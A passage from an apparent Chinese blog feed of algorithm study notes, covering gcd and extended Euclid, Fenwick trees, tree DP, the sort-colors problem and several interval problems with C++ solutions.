    <content type="html"><![CDATA[<h4 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h4><p>欧几里得算法,也即辗转相除法，可以用来求最大公约数，即gcd(a,b) &#x3D; gcd(b,a%b)。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> b? <span class="hljs-built_in">gcd</span>(b,a%b):a;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h4><p>定理：对于不完全为 0 的非负整数 a，b，gcd（a，b）表示 a，b 的最大公约数，必然存在整数对 x，y ，使得 gcd（a，b）&#x3D;a<em>x+b</em>y。拓展欧几里得就是用来求一个可能的一对数x,y。<br>原理：<br>设 a&gt;b。<br>显然当 b&#x3D;0，gcd（a，b）&#x3D;a。此时 x&#x3D;1，y&#x3D;0；<br>当ab!&#x3D;0 时<br>设 ax1+by1&#x3D;gcd(a,b);<br>bx2+(a mod b)y2&#x3D;gcd(b,a mod b);<br>根据朴素的欧几里德原理有 gcd(a,b)&#x3D;gcd(b,a mod b);<br>则:ax1+by1&#x3D;bx2+(a mod b)y2;<br>即:ax1+by1&#x3D;bx2+(a-(a&#x2F;b)*b)y2&#x3D;ay2+bx2-(a&#x2F;b)*by2;<br>根据恒等定理得：x1&#x3D;y2; y1&#x3D;x2-(a&#x2F;b)*y2，可以利用此方法递归求解;<br>这样我们就得到了求解 x1,y1 的方法：x1，y1 的值基于 x2，y2.<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span>&amp;x,<span class="hljs-type">int</span>&amp;y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!b)<span class="hljs-comment">//递归边界，得到最大公约数</span><br>    &#123;<br>        x=<span class="hljs-number">1</span>;<br>        y=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(b,a%b,y,x);<span class="hljs-comment">//递归求最大公约数</span><br>    y-=a/b*x;<span class="hljs-comment">//迭代，回溯。</span><br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树状数组</title>
    <link href="/2022/12/30/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <url>/2022/12/30/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<p>树状数组用来解决单点修改和区间查询时，代码实现比线段树简单。<br>在树状数组t中，t[x]，x表示t[x]覆盖的长度。<br><img src="/upload/2022/06/image-0abb10dc93ed4b4488c38a0439d9dab9.png" alt="image.png"></p><h4 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h4><p>可以知道数值x的二进制最低位的1及后面的0表示的数字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x &amp; -x;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="单点修改"><a href="#单点修改" class="headerlink" title="单点修改"></a>单点修改</h4><p>下标x每次加lowbit(x)即可找到其父亲节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs language">void add(int x, int k) &#123;<br>  while (x &lt;= n) &#123;  <br>    c[x] = c[x] + k;<br>    x = x + lowbit(x);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h4><p>下标x每次减lowbit(x)即可得到前面覆盖一层的节点下标。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//前缀和</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;  <span class="hljs-comment">// a[1]..a[x]的和</span><br>  <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (x &gt;= <span class="hljs-number">1</span>) &#123;<br>    ans = ans + c[x];<br>    x = x - <span class="hljs-built_in">lowbit</span>(x);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树形dp</title>
    <link href="/2022/12/30/%E6%A0%91%E5%BD%A2dp/"/>
    <url>/2022/12/30/%E6%A0%91%E5%BD%A2dp/</url>
    
    <content type="html"><![CDATA[<p>树形 DP，即在树上进行的 DP。由于树固有的递归性质，树形 DP 一般都是递归进行的。<br>经典例题：没有上司的舞会。<br><a href="https://www.acwing.com/activity/content/problem/content/1012/">https://www.acwing.com/activity/content/problem/content/1012/</a><br>状态设定：<br>dp[u][2]&#x2F;&#x2F;0表示不选该点，1表示选该节点的快乐指数。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">6005</span>;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">tree</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br><span class="hljs-type">int</span> happy[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">bool</span> vis[N];<br><span class="hljs-type">int</span> dp[N][<span class="hljs-number">2</span>];<span class="hljs-comment">//0表示不选该点，1表示选该节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//递归求解</span></span><br><span class="hljs-function"></span>&#123;<br>    dp[u][<span class="hljs-number">1</span>] = happy[u];<span class="hljs-comment">//选该节点，那么dp[u][1]等于该快乐值</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:tree[u])<span class="hljs-comment">//遍历所有孩子</span><br>    &#123;<br>        <span class="hljs-built_in">dfs</span>(v);<span class="hljs-comment">//递归搜索</span><br>        dp[u][<span class="hljs-number">0</span>] +=<span class="hljs-built_in">max</span>(dp[v][<span class="hljs-number">0</span>],dp[v][<span class="hljs-number">1</span>]);<span class="hljs-comment">//状态转移，当不选该节点时，最大快乐值为选择或不选该孩子节点的最大值。</span><br>        dp[u][<span class="hljs-number">1</span>] += dp[v][<span class="hljs-number">0</span>];<span class="hljs-comment">//当选择该点时，不能选孩子节点，所有快乐值为dp[v][0]。</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        cin&gt;&gt;happy[i];<span class="hljs-comment">//输入节点值</span><br>    &#125;<br>    <span class="hljs-type">int</span> l,k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n<span class="hljs-number">-1</span>;i++)<span class="hljs-comment">//建树</span><br>    &#123;<br>        cin&gt;&gt;l&gt;&gt;k;<br>        tree[k].<span class="hljs-built_in">push_back</span>(l);<br>        vis[l] =<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> root = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(vis[root])<span class="hljs-comment">//找root节点</span><br>    &#123;<br>        root++;<br>    &#125;<br>    <span class="hljs-built_in">dfs</span>(root);<br>    cout&lt;&lt;<span class="hljs-built_in">max</span>(dp[root][<span class="hljs-number">0</span>],dp[root][<span class="hljs-number">1</span>])&lt;&lt;endl;<span class="hljs-comment">//最大值为选择根节点与不选择根节点当中的最大值。</span><br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>三向切分问题</title>
    <link href="/2022/12/30/%E4%B8%89%E5%90%91%E5%88%87%E5%88%86(%E8%8D%B7%E5%85%B0%E5%9B%BD%E6%97%97%E9%97%AE%E9%A2%98)/"/>
    <url>/2022/12/30/%E4%B8%89%E5%90%91%E5%88%87%E5%88%86(%E8%8D%B7%E5%85%B0%E5%9B%BD%E6%97%97%E9%97%AE%E9%A2%98)/</url>
    
    <content type="html"><![CDATA[<p><a href="https://leetcode.cn/problems/sort-colors/">https://leetcode.cn/problems/sort-colors/</a><br>数据特殊，可利用排序直接得到答案啊,也可以利用双指针法。<br>设置两个指针l,r。l从0开始，r从末尾开始。遍历数组，当i遇到0时与l指针元素互换位置。当遇到2时与r指针互换位置。注意到：与r互换位置后，nums[i]有可能仍为2,所以需要循环进行交换判断。 与l交换时没有这样的问题，因为i为从左到右扫描，不可能交换后仍为0。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sortColors</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r =nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(i&lt;=r &amp;&amp; nums[i]==<span class="hljs-number">2</span>)<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(nums[i],nums[r]);<br>                --r;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(nums[i]==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(nums[i],nums[l]);<br>                ++l;<br>            &#125;<br>        &#125;<br>     &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区间问题</title>
    <link href="/2022/12/30/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/"/>
    <url>/2022/12/30/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>1.区间选点&#x2F;最大不相交区间数量。<br><a href="https://www.acwing.com/problem/content/907/">https://www.acwing.com/problem/content/907/</a><br><a href="https://www.acwing.com/activity/content/problem/content/1112/">https://www.acwing.com/activity/content/problem/content/1112/</a><br>思路即按右区间端点大小对所有区间进行排序，然后找到最多相交的区间然后化为一组。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;a;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,y;<br>        cin&gt;&gt;x&gt;&gt;y;<br>        a.<span class="hljs-built_in">push_back</span>(&#123;x,y&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-keyword">auto</span>&amp;x,<span class="hljs-keyword">auto</span>&amp;y)&#123;<br>       <span class="hljs-keyword">return</span> x.second&lt;y.second; <br>    &#125;);<br>    <span class="hljs-type">int</span> res= <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> last = <span class="hljs-number">-1e9</span><span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;p:a)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p.first&gt;last)<span class="hljs-comment">//如果遍历到的区间的左区间大于上一个区间的右区间，则需要新加一组。</span><br>        &#123;<br>            res++;<br>            last =p.second;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.区间分组。<br><a href="https://www.acwing.com/problem/content/908/">https://www.acwing.com/problem/content/908/</a><br>找到最少的组，每组中区间两两不相交。<br>思路：对所有区间的左区间进行排序，然后依次加入右端点最小堆，若区间的左端点小于堆顶右端点的最小值，则区间相交不能合并。若大于右端点的最小值，则合并为一组，并更新该组的右端点的值为该区间的值。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br>vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">p</span>(N,<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;());<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        p[i].first =a;<br>        p[i].second =b;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(p.<span class="hljs-built_in">begin</span>(),p.<span class="hljs-built_in">begin</span>()+n,[&amp;](pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;a,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;b)&#123;<br>        <span class="hljs-keyword">return</span> a.first&lt;b.first;<br>    &#125;);<br>    <span class="hljs-keyword">auto</span> cmp = [&amp;](pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;a,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a.second&gt;b.second;<br>    &#125;;<br>    priority_queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;,vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;,<span class="hljs-keyword">decltype</span>(cmp)&gt;<span class="hljs-built_in">pq</span>(cmp);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pq.<span class="hljs-built_in">empty</span>() ||  pq.<span class="hljs-built_in">top</span>().second&gt;=p[i].first) pq.<span class="hljs-built_in">push</span>(p[i]);<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            pq.<span class="hljs-built_in">pop</span>();<br>            pq.<span class="hljs-built_in">push</span>(p[i]);<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;pq.<span class="hljs-built_in">size</span>()&lt;&lt;endl;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>3.区间覆盖<br><a href="https://www.acwing.com/activity/content/problem/content/1114/">https://www.acwing.com/activity/content/problem/content/1114/</a><br>思路：对所有区间按左端点进行排序，遍历区间，找到右端点大于要覆盖区间[s,t]的区间，对[s,t]进行更新，最终判断是否能够覆盖。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> s,t;<br>    cin&gt;&gt;s&gt;&gt;t;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;p;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        p.<span class="hljs-built_in">push_back</span>(&#123;a,b&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(p.<span class="hljs-built_in">begin</span>(),p.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-keyword">auto</span>&amp;a,<span class="hljs-keyword">auto</span>&amp;b)&#123;<br>        <span class="hljs-keyword">return</span> a.first&lt;b.first;<br>    &#125;);<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">bool</span> flag =<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> j=i;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">-2e9</span>;<br>        <span class="hljs-keyword">while</span>(j&lt;n&amp;&amp;p[j].first&lt;=s)<span class="hljs-comment">//找到s左侧所有的区间。</span><br>        &#123;<br>            r= <span class="hljs-built_in">max</span>(r,p[j].second);<span class="hljs-comment">//确定能延伸到右侧的最大值</span><br>            ++j;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(r&lt;s)<span class="hljs-comment">//若最大值也不能超过s,那么无法被覆盖。</span><br>        &#123;<br>            res =<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ++res;<span class="hljs-comment">//使用能延伸到最右侧的最大值的区间</span><br>        <span class="hljs-keyword">if</span>(r&gt;=t)<span class="hljs-comment">//若已经能覆盖完全，结束寻找</span><br>        &#123;<br>            flag =<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        s=r;<span class="hljs-comment">//更新左端点。</span><br>        i=j<span class="hljs-number">-1</span>;<span class="hljs-comment">//更新i</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(!flag) res=<span class="hljs-number">-1</span>;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>4.查询合并区间问题。<br><a href="https://leetcode.cn/problems/range-module/">https://leetcode.cn/problems/range-module/</a><br>珂朵莉树。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RangeModule</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;mp; <span class="hljs-comment">//[R,L]形式存储，方便查找</span><br>    <span class="hljs-built_in">RangeModule</span>() &#123;<br><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = left;<br>        <span class="hljs-type">int</span> r =right;<br>        <span class="hljs-keyword">auto</span> p  =mp.<span class="hljs-built_in">lower_bound</span>(left);<span class="hljs-comment">//找到第一个右端点大于left 的区间</span><br>        <span class="hljs-keyword">while</span>(p!=mp.<span class="hljs-built_in">end</span>() &amp;&amp; p-&gt;second&lt;=r)<br>        &#123;<br>            l = <span class="hljs-built_in">min</span>(l,p-&gt;second);<br>            r = <span class="hljs-built_in">max</span>(r,p-&gt;first);<br>            <span class="hljs-keyword">auto</span> t =p;<br>            p++;<br>            mp.<span class="hljs-built_in">erase</span>(t);<br>        &#125; <br>        mp[r]=l;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">queryRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">auto</span> p = mp.<span class="hljs-built_in">lower_bound</span>(left);<br>        <span class="hljs-keyword">if</span>(p==mp.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(p-&gt;second&lt;=left &amp;&amp; p-&gt;first&gt;= right) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">auto</span> p = mp.<span class="hljs-built_in">lower_bound</span>(left+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">while</span>(p!=mp.<span class="hljs-built_in">end</span>() &amp;&amp; p-&gt;second&lt;=right)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(p-&gt;second&lt;left)<br>            &#123;<br>                mp[left] = p-&gt;second;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(p-&gt;first&gt;right)<br>            &#123;<br>                mp[ p-&gt;first] =right;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <br>            &#123;<br>            <span class="hljs-keyword">auto</span> t =p;<br>            p++;<br>            mp.<span class="hljs-built_in">erase</span>(t);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your RangeModule object will be instantiated and called as 